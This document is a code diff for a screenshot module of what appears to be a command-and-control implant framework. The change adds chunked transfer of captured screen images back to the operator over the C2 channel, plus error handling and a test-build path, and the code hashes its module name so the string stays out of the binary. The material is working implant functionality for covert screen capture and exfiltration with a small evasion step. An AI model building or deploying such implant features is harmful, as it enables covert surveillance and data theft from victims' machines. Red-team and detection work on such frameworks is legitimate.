@@ -7,6 +7,7 @@
 
 #include "Common.hpp"
 
+#include <algorithm>
 #include <cstring>
 #include <chrono>
 #include <sstream>
@@ -17,6 +18,7 @@ using namespace std;
 // Compute hash of moduleName at compile time, so the moduleName string don't show in the binary
 constexpr std::string_view moduleName = "screenShot";
 constexpr unsigned long long moduleHash = djb2(moduleName);
+constexpr std::size_t CHUNK_SIZE = 1 * 1024 * 1024;
 
 
 #ifdef _WIN32
@@ -78,7 +80,39 @@ int ScreenShot::init(std::vector<std::string> &splitedCmd, C2Message &c2Message)
 }
 
 
-#define ERROR_OPEN_FILE 1 
+#define ERROR_OPEN_FILE 1
+#define ERROR_CAPTURE_SCREEN 2
+
+int ScreenShot::emitChunk(C2Message& c2RetMessage)
+{
+    if (m_screenshotBuffer.empty() || m_bytesSent >= m_screenshotBuffer.size())
+        return 0;
+
+    const std::size_t totalSize = m_screenshotBuffer.size();
+    const std::size_t chunkSize = std::min(CHUNK_SIZE, totalSize - m_bytesSent);
+    c2RetMessage.set_instruction(std::to_string(moduleHash));
+    c2RetMessage.set_cmd("");
+    c2RetMessage.set_uuid(m_taskUuid);
+    c2RetMessage.set_outputfile(m_outputfile);
+    c2RetMessage.set_args(m_bytesSent == 0 ? "0" : "1");
+    c2RetMessage.set_data(m_screenshotBuffer.data() + m_bytesSent, chunkSize);
+
+    m_bytesSent += chunkSize;
+    if (m_bytesSent == totalSize)
+    {
+        c2RetMessage.set_returnvalue("Success");
+        m_outputfile.clear();
+        m_taskUuid.clear();
+        m_screenshotBuffer.clear();
+        m_bytesSent = 0;
+    }
+    else
+    {
+        c2RetMessage.set_returnvalue(std::to_string(m_bytesSent) + "/" + std::to_string(totalSize));
+    }
+
+    return 1;
+}
 
 
 int ScreenShot::process(C2Message &c2Message, C2Message &c2RetMessage)
@@ -91,11 +125,27 @@ int ScreenShot::process(C2Message &c2Message, C2Message &c2RetMessage)
     std::vector<unsigned char> dataScreen;
     ScreenShooter::CaptureScreen(dataScreen);
 
-    std::string buffer(dataScreen.begin(), dataScreen.end());
-    c2RetMessage.set_data(buffer);
+    if (dataScreen.empty())
+    {
+        c2RetMessage.set_errorCode(ERROR_CAPTURE_SCREEN);
+        return 0;
+    }
 
-    c2RetMessage.set_returnvalue("Success");
-#endif    
+    m_outputfile = c2Message.outputfile();
+    m_taskUuid = c2Message.uuid();
+    m_screenshotBuffer.assign(dataScreen.begin(), dataScreen.end());
+    m_bytesSent = 0;
+    emitChunk(c2RetMessage);
+#elif defined(C2CORE_BUILD_TESTS)
+    if (!c2Message.data().empty())
+    {
+        m_outputfile = c2Message.outputfile();
+        m_taskUuid = c2Message.uuid();
+        m_screenshotBuffer = c2Message.data();
+        m_bytesSent = 0;
+        emitChunk(c2RetMessage);
+    }
+#endif
 
     return 0;
 }
@@ -109,6 +159,8 @@ int ScreenShot::errorCodeToMsg(const C2Message &c2RetMessage, std::string& error
     {
         if(errorCode==ERROR_OPEN_FILE)
             errorMsg = "Failed: Couldn't open file";
+        else if(errorCode==ERROR_CAPTURE_SCREEN)
+            errorMsg = "Failed: screen capture returned no data";
     }
 #endif
     return 0;
@@ -136,9 +188,7 @@ std::string getFilenameTimestamp()
 
 int ScreenShot::recurringExec(C2Message& c2RetMessage) 
 {
-    // TODO
-    
-    return 1;
+    return emitChunk(c2RetMessage);
 }
 
 
